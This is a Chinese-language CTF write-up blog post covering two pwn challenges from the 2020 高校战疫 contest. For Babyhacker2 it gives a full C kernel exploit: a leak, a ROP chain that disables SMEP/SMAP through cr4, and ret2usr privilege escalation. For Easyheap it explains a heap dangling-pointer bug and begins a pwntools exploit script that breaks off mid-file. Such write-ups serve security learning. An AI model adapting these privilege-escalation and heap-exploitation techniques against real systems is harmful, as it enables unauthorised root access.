<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>高校战疫网络安全分享赛 WP | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Babyhacker2分析首先我们看一下startvm.sh   有时间限制，并且开启了kalsr,smep,smap的保护。即内核不能访问用户空间的数据和代码，这个保护可以通过修改cr4寄存器来关闭。我们看一下虚拟机本身 1cpio -idmv &lt; initramfs.cpio    首先是加载了babyhacker.ko的驱动，这里驱动开启了canary和NX保护。接着将dmesg_re">
<meta property="og:type" content="article">
<meta property="og:title" content="高校战疫网络安全分享赛 WP">
<meta property="og:url" content="https://www.lyyl.online/posts/213364399.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="Babyhacker2分析首先我们看一下startvm.sh   有时间限制，并且开启了kalsr,smep,smap的保护。即内核不能访问用户空间的数据和代码，这个保护可以通过修改cr4寄存器来关闭。我们看一下虚拟机本身 1cpio -idmv &lt; initramfs.cpio    首先是加载了babyhacker.ko的驱动，这里驱动开启了canary和NX保护。接着将dmesg_re">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-52.jpeg">
<meta property="article:published_time" content="2020-08-07T10:52:45.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.326Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-52.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/213364399"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '高校战疫网络安全分享赛 WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-52.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">高校战疫网络安全分享赛 WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2020-08-07T10:52:45.000Z" title="undefined 2020-08-07 18:52:45">2020-08-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="高校战疫网络安全分享赛 WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Babyhacker2"><a href="#Babyhacker2" class="headerlink" title="Babyhacker2"></a>Babyhacker2</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先我们看一下<code>startvm.sh</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807185413.png" alt="图片无法显示，请联系作者" title=" ">

<p>有时间限制，并且开启了<code>kalsr,smep,smap</code>的保护。即内核不能访问用户空间的数据和代码，这个保护可以通过修改<code>cr4</code>寄存器来关闭。我们看一下虚拟机本身</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; initramfs.cpio</span><br></pre></td></tr></table></figure>

<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807185715.png" alt="图片无法显示，请联系作者" title=" ">

<p>首先是加载了<code>babyhacker.ko</code>的驱动，这里驱动开启了<code>canary</code>和<code>NX</code>保护。接着将<code>dmesg_restrict/kptr_restrict</code>置为<code>0</code>意味着我们可以通过<code>cat kallsyms</code>查看<code>commit_creds/prepare_kernel_cred</code>两个函数的地址。通过<code>commit_creds(prepare_kernel_cred(0))</code>调用来实现提权。</p>
<p>漏洞出现在<code>0x30000</code>的操作处</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807190111.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们传入的<code>rdx</code>是一个<code>signedint</code>，因此我们可以通过输入负数来实现判断的绕过</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807190219.png" alt="图片无法显示，请联系作者" title=" ">

<p>绕过判断之后就可以将<code>di</code>即后两个字节赋值给<code>buffersize</code>。由于读取和写入的操作是通过<code>buffersize</code>来控制的，因此我们可以实现栈内容的泄露和栈溢出覆盖返回地址<code>ROP</code>。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
<li>修改<code>buffersize</code>的大小，泄露<code>canary,rbp,ret</code>的地址，实现内核基址的获取，绕过<code>kalsr,canary</code>。</li>
<li>修改<code>buffersize</code>的大小，将<code>rop</code>链写入到返回地址位置，关闭<code>smep,smap</code>，执行用户空间的提权代码提权，返回用户空间<code>getshell</code>。</li>
</ul>
<p>提权时采用的是<code>ret2usr</code>，即利用我们写好的函数进行提权操作。当执行两个内核空间的提权函数的时候，我们处于<code>ring0</code>级别，因此可以正常执行。但是要<code>getshell</code>需要返回用户空间去执行，这里利用到了<code>swags,iretq</code>来返回用户空间，但是在这之前需要我们保存<code>CS, flags, esp </code>等信息，供<code>iretq</code>使用。</p>
<blockquote>
<p>GDB调试</p>
<p>首先在qemu中lsmod找到babyhacker的加载基址0xffffffffc0000000，接着在gdb中执行</p>
<p>add-symbol-file babyhacker.ko 0xffffffffc0000000</p>
<p>b *0xffffffffc0000000+0x70</p>
<p>set architecture i386:x86-64:intel</p>
<p>target remote :1234 //getchar()</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_stack = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> p_rdi_r = <span class="number">0xffffffff8109054d</span>;</span><br><span class="line"><span class="type">size_t</span> mv_rc4_rdi_p_rbp_r = <span class="number">0xffffffff81004d70</span>;</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getroot</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq\n&quot;</span></span><br><span class="line">        :</span><br><span class="line">        :  <span class="string">&quot;r&quot;</span> (user_ss), <span class="string">&quot;r&quot;</span> (user_stack), <span class="string">&quot;r&quot;</span> (user_rflags), <span class="string">&quot;r&quot;</span> (user_cs), <span class="string">&quot;r&quot;</span> (get_shell)</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_stack), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	save_state();</span><br><span class="line">	commit_creds = <span class="number">0xffffffff810a1430</span>;</span><br><span class="line">	prepare_kernel_cred = <span class="number">0xffffffff810a1820</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/babyhacker&quot;</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();<span class="comment">//此处开始调试</span></span><br><span class="line"></span><br><span class="line">	ioctl(fd, <span class="number">0x30000</span>, <span class="number">0xf000ffff</span>);</span><br><span class="line">	<span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">	ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// int i = 0;</span></span><br><span class="line">	<span class="comment">// for(i = 0; i&lt; 0x50; i++)&#123;</span></span><br><span class="line">	<span class="comment">// 	printf(&quot;%x--%zx\n&quot;, i, buf[i]);</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> canary = buf[<span class="number">40</span>];</span><br><span class="line">	<span class="type">size_t</span> orl_ebp = buf[<span class="number">41</span>];</span><br><span class="line">	<span class="type">size_t</span> ret_address = buf[<span class="number">42</span>];</span><br><span class="line">	<span class="type">size_t</span> offset = <span class="number">0xffffffff81219218</span> - ret_address;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;canary: %p--  ret_address: %p -- offset: %d\n&quot;</span>, canary, ret_address, offset);</span><br><span class="line"></span><br><span class="line">	commit_creds += offset;</span><br><span class="line">	prepare_kernel_cred += offset;</span><br><span class="line">	p_rdi_r += offset;</span><br><span class="line">	mv_rc4_rdi_p_rbp_r += offset;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;commit_creds : %p\nprepare_kernel_cred: %p\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class="line">	ioctl(fd, <span class="number">0x30000</span>, <span class="number">0xf000ffff</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> index = <span class="number">40</span>;</span><br><span class="line">	rop[index++] = canary;</span><br><span class="line">	rop[index++] = orl_ebp;</span><br><span class="line">	rop[index++] = p_rdi_r;</span><br><span class="line">	rop[index++] = <span class="number">0x6f0</span>;</span><br><span class="line">	rop[index++] = mv_rc4_rdi_p_rbp_r;</span><br><span class="line">	rop[index++] = orl_ebp;</span><br><span class="line">	rop[index++] = getroot;</span><br><span class="line">	ioctl(fd, <span class="number">0x30001</span>, rop);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Easyheap"><a href="#Easyheap" class="headerlink" title="Easyheap"></a>Easyheap</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>程序一共提供了三种功能分别是<code>add,delete,edit</code>。注意到在<code>delete</code>的时候已经将指针清空，最多同时存在三个指针，用户申请的内存的最大大小为<code>0x400</code>。但是在<code>add</code>的时候，判断用户大小的逻辑处出了问题</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807223321.png" alt="图片无法显示，请联系作者" title=" ">

<p>注意到在判断逻辑之前指针已经被赋值到<code>ptr</code>中了，而当用户输入的大小大于<code>0x400</code>的时候并没有释放这一部分内存，清空这一部分的指针。</p>
<p>假如我们之前申请了两次<code>0x50</code>大小的堆块，并全部释放，此时<code>fastbin</code>中存在两个<code>0x20</code>大小的堆块。此时申请大于<code>0x400</code>的堆块的时候，<code>ptr[0]</code>中的指针会是最后一次释放的<code>fastbin</code>，并且<code>fd</code>指针指向下一个<code>fastbin</code>，<code>size</code>没有被清空的情况下，我们就可以通过<code>edit</code>控制下一个<code>fastbin</code>堆块内容。</p>
<p><code>0x10</code>大小的堆块标识如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typeof <span class="class"><span class="keyword">struct</span> <span class="title">con</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* content;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><ul>
<li><p>申请大小为<code>0x40,0x50</code>的堆块，并释放。此时申请<code>0x500,0x20,0x50</code>的堆块，堆布局如下</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200807224350.png" alt="图片无法显示，请联系作者" title=" ">

<p>此时我们修改<code>ptr[0]</code>使得<code>ptr[1]</code>的<code>content</code>指向<code>ptr[2]</code>，也就是将<code>0x603000</code>的最后一个字节覆写为<code>0x30</code>，这样<code>edit ptr[0]</code>就可以更改<code>ptr[1]</code>的<code>content</code>为我们想要任意写的内存地址，此时<code>edit ptr[1]</code>就是向我们想要写的内存地址处写内容了。实现了任意写。</p>
</li>
<li><p>通过<code>edit ptr[1],ptr[2]</code>实现的任意写将<code>free.got</code>改写为<code>puts.plt</code>，将<code>ptr[2]</code>的<code>content</code>改写为想要泄露地址的函数的<code>got</code>地址，就可以泄露到的<code>libc</code>基址。</p>
</li>
<li><p>通过<code>edit ptr[0],ptr[1]</code>实现的任意写将<code>atoi</code>的地址改写为<code>system</code>，输入<code>/bin/sh</code>进行<code>getshell</code>。</p>
</li>
</ul>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./easyheap&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x400B98\n&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;this message?\n&quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    <span class="keyword">if</span> length &lt;= <span class="number">0x400</span>:</span><br><span class="line">        p.sendafter(<span class="string">&quot;the message?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;to be deleted?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;be modified?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;the message?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message_exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&quot;0&quot;</span>) <span class="comment"># 0x20 0x50</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&quot;1&quot;</span>) <span class="comment"># 